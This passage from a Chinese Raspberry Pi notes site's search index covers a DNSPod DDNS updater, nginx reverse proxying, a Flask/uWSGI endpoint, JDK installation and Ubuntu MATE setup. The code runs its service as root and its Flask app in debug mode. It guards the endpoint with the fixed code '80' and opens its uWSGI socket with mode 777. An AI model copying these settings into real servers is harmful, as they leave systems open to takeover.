__name__ == '__main__': get_domain_id() \u6ce8\u610f\uff1a \u5bf9\u4e8e\u4fee\u6539\u8bb0\u5f55API\u7684\u8c03\u7528\uff0cDNSPod\u6709\u9650\u5236\uff1a\u5982\u679c1\u5c0f\u65f6\u4e4b\u5185\uff0c\u63d0\u4ea4\u4e86\u8d85\u8fc75\u6b21\u6ca1\u6709\u4efb\u4f55\u53d8\u52a8\u7684\u8bb0\u5f55\u4fee\u6539\u8bf7\u6c42\uff0c\u8be5\u8bb0\u5f55\u4f1a\u88ab\u7cfb\u7edf\u9501\u5b9a1\u5c0f\u65f6\uff0c\u4e0d\u5141\u8bb8\u518d\u6b21\u4fee\u6539\u3002\u6bd4\u5982\u539f\u8bb0\u5f55\u503c\u5df2\u7ecf\u662f 1.1.1.1\uff0c\u65b0\u7684\u8bf7\u6c42\u8fd8\u8981\u6c42\u4fee\u6539\u4e3a 1.1.1.1\u3002","title":"DDNS\u90e8\u5206"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_7","text":"nginx\u914d\u7f6e\u6587\u4ef6\u4e2d\u53cd\u5411\u4ee3\u7406server\uff1a server { listen 80; server_name pi.polarxiong.com; location / { proxy_pass http://[2001:250:5002:8100::3:9b63]; # for raspberry pi proxy_set_header Host $host; } } python\u5b9e\u73b0\u4ee3\u7801\uff1a def update_nginx_config(self, ip): with open('/etc/nginx/sites-available/default', 'r') as f: s = f.read() r = re.compile(r'http://\\[(.*?)\\]; \\# for raspberry pi') s = s.replace(r.findall(s)[0], ip) with open('/etc/nginx/sites-available/default', 'w') as f: f.write(s) os.popen('service nginx restart') \u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u627e\u5230\u9700\u8981\u4fee\u6539\u7684IPv6\u5730\u5740\uff08 \u6240\u4ee5# for raspberry pi\u5fc5\u4e0d\u53ef\u5c11 \uff09\uff0c\u518d\u901a\u8fc7\u5b57\u7b26\u4e32\u66ff\u6362\uff08\u5c1d\u8bd5\u76f4\u63a5\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u66ff\u6362\uff0c\u4f46\u4e00\u76f4\u6ca1\u5b9e\u73b0\uff09\uff0c\u91cd\u65b0\u5199\u5165\u914d\u7f6e\u6587\u4ef6\uff1b\u6700\u540e\u91cd\u542fnginx\u670d\u52a1\u3002 \u5b9e\u9645\u4e0a\u8fd9\u662f\u4e00\u6bb5\u5f88\u5371\u9669\u7684\u4ee3\u7801\uff0c\u4f1a\u76f4\u63a5\u4fee\u6539nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u4e14\u901a\u8fc7\u547d\u4ee4\u884c\u91cd\u542fnginx\u670d\u52a1\u3002","title":"\u53cd\u5411\u4ee3\u7406\u90e8\u5206"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#flask","text":"\u5148\u8d34\u4ee3\u7801\uff1a from flask import Flask, request import Ddns application = Flask(__name__) @application.route('/ipv6') def ipv6(): code = request.args['code'] if code != '80': return 'Bad Request' ip = request.remote_addr d = Ddns.Ddns() t = d.update(ip) return t if __name__ == '__main__': application.debug = True application.run() \u5ba2\u6237\u7aef\u53d1\u9001GET\u8bf7\u6c42\uff0cFlask\u6536\u5230\u8bf7\u6c42\u540e\u9996\u5148\u6821\u5bf9 code \uff0c\u7528\u6765\u9632\u6b62\u6076\u610f\u8bf7\u6c42\u3002\u7136\u540e\u83b7\u53d6\u5ba2\u6237\u7aefIP\u5730\u5740\uff0c\u4ea4\u7ed9python\u53bb\u5b9e\u73b0\u3002","title":"Flask\u914d\u7f6e"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#uwsgi","text":"\u5173\u4e8enginx+uwsgi+flask\u7684\u914d\u7f6e\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\u4ecb\u7ecd\u8fc7\uff0c\u8fd9\u91cc\u5c31\u53ea\u5199\u4e3b\u8981\u90e8\u5206","title":"uwsgi\u914d\u7f6e"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#systemd","text":"\u8def\u5f84\uff1a /etc/systemd/system/ddns.service [Unit] Description=uWSGI instance to serve DDNS After=network.target [Service] User=root Group=root WorkingDirectory=/home/zhantong/ddns Enrironment=\"PATH=/usr/bin\" ExecStart=/usr/bin/uwsgi --ini ddns.ini [Install] WantedBy=multi-user.target \u8fd9\u91cc\u8bbe\u5b9aUser\u548cGroup\u5747\u4e3aroot\u662f\u6781\u5176\u5371\u9669\u7684\uff0c\u4f46\u4e5f\u662f\u5fc5\u987b\u7684\uff0c\u56e0\u4e3a\u9700\u8981\u8bfb\u53d6\u548c\u5199\u5165nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u4e14\u901a\u8fc7\u547d\u4ee4\u884c\u91cd\u542fnginx\u670d\u52a1\u3002","title":"systemd\u4e2d\u914d\u7f6e\u670d\u52a1"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#uwsgi_1","text":"\u8def\u5f84\uff1a /home/zhantong/ddns [uwsgi] module = proxy_and_ddns processes = 1 vhost = true socket = ddns.sock chmod-socket = 777 vacuum = true die-on-term = true \u8fd9\u91cc\u5176\u5b9e\u6709\u4e00\u4e9b\u7ec6\u8282\u95ee\u9898\uff0c\u5c31\u4e0d\u8bf4\u4e86\u3002 proxy_and_ddns \u5c31\u662f proxy_and_dds.py \uff0cflask\u4ee3\u7801\u3002","title":"uwsgi\u914d\u7f6e\u6587\u4ef6"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#nginx","text":"\u6700\u540e\u9700\u8981\u52a0\u5165\u8bf7\u6c42URL\uff0c\u5e76\u5c06\u5176\u8f6c\u53d1\u5230flask\uff0c\u6240\u4ee5nginx\u5173\u4e8e\u8fd9\u90e8\u5206\u7684server\uff1a server { listen [::]:80 ipv6only=on; server_name ipv6.polarxiong.com; location / { include uwsgi_params; uwsgi_pass unix:/home/zhantong/ddns/ddns.sock; } } ipv6.polarxiong.com\u5728DNSPod\u4e2d\u8bbe\u7f6e\u4e86\u8bb0\u5f55\u4e3aAAAA\uff0c\u6307\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u7684IPv6\u5730\u5740\u3002","title":"nginx\u914d\u7f6e"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_8","text":"\u672c\u5730\u670d\u52a1\u5668\u7684\u5de5\u4f5c\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u5bf9\u5bf9\u5e94URL\u53d1\u9001GET\u8bf7\u6c42 import urllib.request code = '80' urllib.request.urlopen('http://ipv6.polarxiong.com/ipv6?code=' + code) \u53ef\u4ee5\u5229\u7528Ubuntu\u4e2d\u7684corn\u6765\u5b9e\u73b0\u5b9a\u65f6\u8fd0\u884c\u3002","title":"\u672c\u5730\u670d\u52a1\u5668"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_9","text":"\u4e0a\u9762\u8bf4\u7684\u5f88\u4e71\uff0c\u4f46\u7406\u987a\u4e86\u8fd8\u662f\u633a\u5bb9\u6613\u7684\uff0c\u6700\u540e\u7684\u7ed3\u679c\u5c31\u662ftest.polarxiong.com\u5bf9\u5e94\u7684IP\u5c31\u662f\u6811\u8393\u6d3e\u7684IPv6\u5730\u5740\uff0c\u5373\u901a\u8fc7IPv6\u8bbf\u95eetest.polarxiong.com\u5c31\u662f\u76f4\u63a5\u8bbf\u95ee\u6811\u8393\u6d3e\uff1b\u800cpi.polarxiong.com\u662f\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u5668\u53cd\u5411\u4ee3\u7406\uff0c\u901a\u8fc7IPv4\u8bbf\u95ee\u6811\u8393\u6d3e\u3002","title":"\u7ed3\u675f"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_10","text":"","title":"\u9644\u5f55"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#flaskpython","text":"","title":"flask\u548cpython\u5b8c\u6574\u4ee3\u7801"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#flask_1","text":"\u6587\u4ef6\u540d\uff1aproxy_and_ddns.py from flask import Flask, request import Ddns application = Flask(__name__) @application.route('/ipv6') def ipv6(): code = request.args['code'] if code != '80': return 'Bad Request' ip = request.remote_addr d = Ddns.Ddns() t = d.update(ip) return t if __name__ == '__main__': application.debug = True application.run()","title":"flask"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#python","text":"\u6587\u4ef6\u540d\uff1aDdns.py import urllib.request import os import re class Ddns(): def update_nginx_config(self, ip): with open('/etc/nginx/sites-available/default', 'r') as f: s = f.read() r = re.compile(r'http://\\[(.*?)\\]; \\# for raspberry pi') s = s.replace(r.findall(s)[0], ip) with open('/etc/nginx/sites-available/default', 'w') as f: f.write(s) os.popen('service nginx restart') def update_dnspod(self, ip): url = 'https://dnsapi.cn/Record.Modify' info = { 'login_email': 'xxx', 'login_password': 'xxx', 'format': 'json', 'domain_id': '23606146', 'record_id': '116841773', 'record_line': '\u9ed8\u8ba4', 'sub_domain': 'test', 'record_type': 'AAAA', 'value': ip } data = urllib.parse.urlencode(info).encode() t = urllib.request.urlopen(url, data=data) return t.read().decode('utf-8') def update(self, ip): t=self.update_dnspod(ip) self.update_nginx_config(ip) return t \u53c2\u8003 -- DNSPod\u7528\u6237API\u6587\u6863 \u2014 DNSPod API Doc 1.0.0 documentation \u7528 Python \u811a\u672c\u5b9e\u73b0\u5bf9 Linux \u670d\u52a1\u5668\u7684\u76d1\u63a7 Nginx\u53cd\u5411\u4ee3\u7406\u7684\u914d\u7f6e -- \u7b80\u660e\u73b0\u4ee3\u9b54\u6cd5 \u539f\u6587\u94fe\u63a5\uff1a https://www.polarxiong.com/archives/\u6811\u8393\u6d3e\u5229\u7528nginx\u53cd\u5411\u4ee3\u7406-\u6210\u4e3aIPv6-IPv4\u516c\u7f51\u670d\u52a1\u5668-\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668.html","title":"python"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85JDK/","text":"\u5b89\u88c5Java11: sudo apt update sudo apt install default-jdk \u9a8c\u8bc1\u5b89\u88c5\uff1a java -version \u8f93\u51fa\u5982\u4e0b\uff1a $ java -version openjdk version \"11.0.10\" 2021-01-19 OpenJDK Runtime Environment (build 11.0.10+9-Ubuntu-0ubuntu1.18.04) OpenJDK Server VM (build 11.0.10+9-Ubuntu-0ubuntu1.18.04, mixed mode) \u914d\u7f6e JAVA_HOME \u73af\u5883\uff1a \u901a\u8fc7 sudo update-alternatives --config java \u83b7\u53d6Java\u5b89\u88c5\u76ee\u5f55\uff1a OpenJDK 11 is located at /usr/lib/jvm/java-11-openjdk-armhf/bin/java OpenJDK 8 is located at /usr/lib/jvm/java-8-openjdk-armhf/jre/bin/java \u7f16\u8f91\u73af\u5883\u53d8\u91cf\uff1a sudo nano /etc/environment \u8bbe\u7f6e\uff1a JAVA_HOME=\"/usr/lib/jvm/java-11-openjdk-armhf/\" \u4f7f\u7528 source /etc/environment \u4f7f\u53d8\u91cf\u751f\u6548\u3002 \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2021/02/25/\u6811\u8393\u6d3e\u5b89\u88c5jdk/ How to Install Java on Raspberry Pi","title":"\u6811\u8393\u6d3e\u5b89\u88c5JDK"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85JDK/#java11","text":"sudo apt update sudo apt install default-jdk \u9a8c\u8bc1\u5b89\u88c5\uff1a java -version \u8f93\u51fa\u5982\u4e0b\uff1a $ java -version openjdk version \"11.0.10\" 2021-01-19 OpenJDK Runtime Environment (build 11.0.10+9-Ubuntu-0ubuntu1.18.04) OpenJDK Server VM (build 11.0.10+9-Ubuntu-0ubuntu1.18.04, mixed mode)","title":"\u5b89\u88c5Java11:"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85JDK/#java_home","text":"\u901a\u8fc7 sudo update-alternatives --config java \u83b7\u53d6Java\u5b89\u88c5\u76ee\u5f55\uff1a OpenJDK 11 is located at /usr/lib/jvm/java-11-openjdk-armhf/bin/java OpenJDK 8 is located at /usr/lib/jvm/java-8-openjdk-armhf/jre/bin/java \u7f16\u8f91\u73af\u5883\u53d8\u91cf\uff1a sudo nano /etc/environment \u8bbe\u7f6e\uff1a JAVA_HOME=\"/usr/lib/jvm/java-11-openjdk-armhf/\" \u4f7f\u7528 source /etc/environment \u4f7f\u53d8\u91cf\u751f\u6548\u3002 \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2021/02/25/\u6811\u8393\u6d3e\u5b89\u88c5jdk/ How to Install Java on Raspberry Pi","title":"\u914d\u7f6eJAVA_HOME\u73af\u5883\uff1a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/","text":"\u6811\u8393\u6d3e\u5b89\u88c5Ubuntu mate15.10-\u7cfb\u7edf\u7b14\u8bb0_machh\u7684\u4e13\u680f-CSDN\u535a\u5ba2 \u955c\u50cf\u5730\u5740 https://ubuntu-mate.org/raspberry-pi/ \u8bbe\u7f6eroot\u8d26\u6237 sudo passwd root \u4e4b\u540e\u8f93\u5165\u4e24\u904droot\u7684\u5bc6\u7801 \u7136\u540e sudo passwd--unlock root 1. \u66f4\u6362\u8f6f\u4ef6\u6e90\uff08apt-get sources\uff09 sudo nano /etc/apt/sources.list \u4e2d\u79d1\u5927\u955c\u50cf\u4e3b\u9875\uff1a<https://lug.ustc.edu.cn/wiki/mirrors/help/raspbian> \u6e05\u534e\u955c\u50cf\u4e3b\u9875\uff1a<https://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/> sudo nano``/etc/apt/sources``.list \u7f16\u8f91 /etc/apt/sources.list \u6587\u4ef6\u3002 \u5220\u9664\u539f\u6587\u4ef6\u6240\u6709\u5185\u5bb9\uff0c\u7528\u4ee5\u4e0b\u5185\u5bb9\u53d6\u4ee3\uff1a deb <http://mirrors.ustc.edu.cn/raspbian/raspbian>/ wheezy main non-free contrib deb-src <http://mirrors.ustc.edu.cn/raspbian/raspbian>/ wheezy main non-free contrib \u7f16\u8f91\u6b64\u6587\u4ef6\u540e\uff0c\u8bf7\u4f7f\u7528 sudo apt-get update \u547d\u4ee4\uff0c\u66f4\u65b0\u8f6f\u4ef6\u5217\u8868\u3002 Ctrl+O\u4fdd\u5b58\u6587\u4ef6 \u3010M+B\u3011\uff0cCtrl+X\u9000\u51fa\u7f16\u8f91\u5668\uff0c \u7136\u540e\u6267\u884c\u547d\u4ee4\u66f4\u65b0\u8f6f\u4ef6\u5217\u8868: sudo apt-get update 2.\u8bbe\u7f6eSSH \u8be6\u7ec6\uff1a ubuntu\u5b89\u88c5 ssh \u5224\u65ad\u662f\u5426\u5b89\u88c5ssh\u670d\u52a1\uff0c\u547d\u4ee4\uff1asshlocalhost \u5982\u679c\u63d0\u793a\uff1a ssh:connecttohostlocalhostport22:Connectionrefused \u5c31\u8868\u793a\u6ca1\u6709\u8fd8\u6ca1\u6709\u5b89\u88c5SSH\uff0c \u5b89\u88c5\u547d\u4ee4\uff1asudoapt-getinstallopenssh-server \u5378\u8f7d\u547d\u4ee4\uff1asudoapt-getremoveopenssh-server \u786e\u8ba4\u662f\u5426\u5b89\u88c5\u6b63\u5e38 ps-e|grepssh 1418?00:00:00sshd \u770b\u5230sshd\u90a3\u8bf4\u660essh-server\u5df2\u7ecf\u542f\u52a8\u4e86 \u5982\u679c\u6ca1\u6709\u5219\u53ef\u4ee5\u8fd9\u6837\u542f\u52a8\uff1asudo/etc/init.d/sshstart\u6216\u8005servicesshstart sudo /etc/init.d/ssh restart\u91cd\u542f ssh-server\u914d\u7f6e\u6587\u4ef6\u4e3a\uff1a/etc/ssh/sshd_config\uff0c\u66f4\u6539\u914d\u7f6e\u9700\u91cd\u542fSSH\u670d\u52a1\u3002 3.\u6269\u5c55\u53ef\u7528\u7a7a\u95f4 \u8f93\u5165sudo fdisk /dev/mmcblk0\u540e\u30100\u96f6 \uff0cl\u5c0f\u5199L\u3011 d \u56de\u8f66 2 \u56de\u8f66 n \u56de\u8f66 p \u56de\u8f66 2\u56de\u8f66 \u7136\u540e\u63d0\u793afirst xxxx \u8fd9\u65f6\u5019\u6309 \u56de\u8f66 \u4e4b\u540e\u63d0\u793aLast xxxxx \u6309\u56de\u8f66 \u6700\u540e\u6309w \u56de\u8f66 sudo reboot \u91cd\u542f\u540e \u518d\u6253\u5f00\u7ec8\u7aef\u8f93\u5165sudo resize2fs /dev/mmcblk0p2 sudo reboot \u8be6\u7ec6 \uff1a \u6269\u5c55\u6811\u8393\u6d3e\u4e2d\u7684SD\u5361\u7a7a\u95f4 4.\u5b89\u88c5VNC 1\u3001sudo apt-get update 2\u3001sudo apt-get install tightvncserver 3\u3001\u5f00\u542f\u670d\u52a1\u5668 tightvncserver \u5907\u6ce8\uff1a\u7b2c\u4e00\u4e2a\u5f00\u542f\u9700\u8981\u914d\u7f6e\u5bc6\u7801 4\u3001VCN\u7684\u7b80\u5355\u63a7\u5236 1) \u505c\u6b62VNC\u7a97\u53e3\uff1avncserver -kill:1 2) \u4fee\u6539\u5bc6\u7801\uff1avncpasswd 3) \u91cd\u542f\u670d\u52a1\u5668\uff1aservice vncserver restart \u8fdc\u7a0b\u684c\u9762\uff08mstsc.exe\uff09\u8fde\u63a5\u6811\u8393\u6d3e sudo``apt-get``install``xrdp 5.\u8bbe\u7f6e\u5206\u8fa8\u7387 \u6811\u8393\u6d3e-\u8bbe\u7f6e\u5c4f\u5e55\u5206\u8fa9\u7387.note \u6811\u8393\u6d3e\u5c4f\u5e55\u65cb\u8f6c\u89d2\u5ea6\u53c2\u6570.note \u6811\u8393\u6d3e \u914d\u7f6e\u6587\u6863 config.txt \u8bf4\u660e .note 6.\u5b89\u88c5samba Ubuntu15.04\u5b89\u88c5samba\u670d\u52a1.note 7\uff0c\u8bbe\u7f6e\u4e2d\u6587 \u6253\u5f00 \u63a7\u5236\u4e2d\u5fc3 \uff08\u5728\u9762\u677f\u7684\u7cfb\u7edf\u91cc\uff09\u70b9\u51fblanguages support \u68c0\u67e5\u8bed\u8a00\u7cfb\u7edf \u70b9\u51fb\u5b89\u88c5 \u91cd\u542f\u5373\u53ef 8.\u5b89\u88c5\u4e2d\u6587\u8f93\u5165\u6cd5 \u8fd9\u91cc\u5b89\u88c5\u7684\u662ffcitx\u7684\u62fc\u97f3\u8f93\u5165\u6cd5\uff1a sudo apt-getinstall fcitx fcitx-sunpinyin sunpinyin\u662f\u57fa\u672c\u7684\u62fc\u97f3\u8f93\u5165\uff0c\u5982\u679c\u9700\u8981\u4e91\u8bcd\u5e93\u62fc\u97f3\uff0c\u4e5f\u5efa\u8bae\u5b89\u88c5google\u62fc\u97f3\u548c\u4e91\u62fc\u97f3 sudo apt-getinstall fcitx-googlepinyin sudo apt-getinstall fcitx-module-cloudpinyin \u53e6\u4e00\u4e2a\u5f00\u6e90\u8f93\u5165\u6cd5RIME\u5728\u6811\u8393\u6d3e\u4e0b\u6548\u679c\u5f88\u597d\uff0c\u57fa\u4e8efcitx\u5b89\u88c5\u4e5f\u5f88\u65b9\u4fbf 1. sudo apt-get install fcitx-rime ubuntu\u5982\u4f55\u5c06\u4e2d\u6587\u8f93\u5165\u6cd5\u5207\u6362\u6210\u82f1\u6587\u8f93\u5165\u6cd5 9.root\u8d26\u6237\u5f00\u542fSSH\u767b\u9646 \u53c2\u8003\u6587\u7ae0 \u6811\u8393\u6d3eraspi2-ubuntu meta\u5b89\u88c5\u914d\u7f6e\u6307\u5bfc \u6811\u8393\u6d3e\u4e0aUbuntu14.04 mate\u8bbe\u7f6e Ubuntu mate \u7cfb\u7edf\u914d\u7f6e > \u6811\u8393\u6d3e\u5427 (baidu) VMware\u4e0aUbuntu\u6587\u4ef6\u5171\u4eab Ubuntu\u4e2d\u6587\u667a\u80fd\u62fc\u97f3\u8f93\u5165\u6cd5\u914d\u7f6e Ubuntu\u4e0bFcitx\u8f93\u5165\u6cd5\u7684\u5b89\u88c5\u4e0e\u914d\u7f6e \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/machh/article/details/51299627","title":"\u6811\u8393\u6d3e\u5b89\u88c5Ubuntu mate15.10 \u7cfb\u7edf\u7b14\u8bb0 machh\u7684\u4e13\u680f CSDN\u535a\u5ba2"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#ubuntu-mate1510-_machh-csdn","text":"\u955c\u50cf\u5730\u5740 https://ubuntu-mate.org/raspberry-pi/ \u8bbe\u7f6eroot\u8d26\u6237 sudo passwd root \u4e4b\u540e\u8f93\u5165\u4e24\u904droot\u7684\u5bc6\u7801 \u7136\u540e sudo passwd--unlock root","title":"\u6811\u8393\u6d3e\u5b89\u88c5Ubuntu mate15.10-\u7cfb\u7edf\u7b14\u8bb0_machh\u7684\u4e13\u680f-CSDN\u535a\u5ba2"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#1-apt-get-sources","text":"sudo nano /etc/apt/sources.list \u4e2d\u79d1\u5927\u955c\u50cf\u4e3b\u9875\uff1a<https://lug.ustc.edu.cn/wiki/mirrors/help/raspbian> \u6e05\u534e\u955c\u50cf\u4e3b\u9875\uff1a<https://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/> sudo nano``/etc/apt/sources``.list \u7f16\u8f91 /etc/apt/sources.list \u6587\u4ef6\u3002 \u5220\u9664\u539f\u6587\u4ef6\u6240\u6709\u5185\u5bb9\uff0c\u7528\u4ee5\u4e0b\u5185\u5bb9\u53d6\u4ee3\uff1a deb <http://mirrors.ustc.edu.cn/raspbian/raspbian>/ wheezy main non-free contrib deb-src <http://mirrors.ustc.edu.cn/raspbian/raspbian>/ wheezy main non-free contrib \u7f16\u8f91\u6b64\u6587\u4ef6\u540e\uff0c\u8bf7\u4f7f\u7528 sudo apt-get update \u547d\u4ee4\uff0c\u66f4\u65b0\u8f6f\u4ef6\u5217\u8868\u3002 Ctrl+O\u4fdd\u5b58\u6587\u4ef6 \u3010M+B\u3011\uff0cCtrl+X\u9000\u51fa\u7f16\u8f91\u5668\uff0c \u7136\u540e\u6267\u884c\u547d\u4ee4\u66f4\u65b0\u8f6f\u4ef6\u5217\u8868: sudo apt-get update","title":"1. \u66f4\u6362\u8f6f\u4ef6\u6e90\uff08apt-get sources\uff09"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#2ssh","text":"\u8be6\u7ec6\uff1a ubuntu\u5b89\u88c5 ssh \u5224\u65ad\u662f\u5426\u5b89\u88c5ssh\u670d\u52a1\uff0c\u547d\u4ee4\uff1asshlocalhost \u5982\u679c\u63d0\u793a\uff1a ssh:connecttohostlocalhostport22:Connectionrefused \u5c31\u8868\u793a\u6ca1\u6709\u8fd8\u6ca1\u6709\u5b89\u88c5SSH\uff0c \u5b89\u88c5\u547d\u4ee4\uff1asudoapt-getinstallopenssh-server \u5378\u8f7d\u547d\u4ee4\uff1asudoapt-getremoveopenssh-server \u786e\u8ba4\u662f\u5426\u5b89\u88c5\u6b63\u5e38 ps-e|grepssh 1418?00:00:00sshd \u770b\u5230sshd\u90a3\u8bf4\u660essh-server\u5df2\u7ecf\u542f\u52a8\u4e86 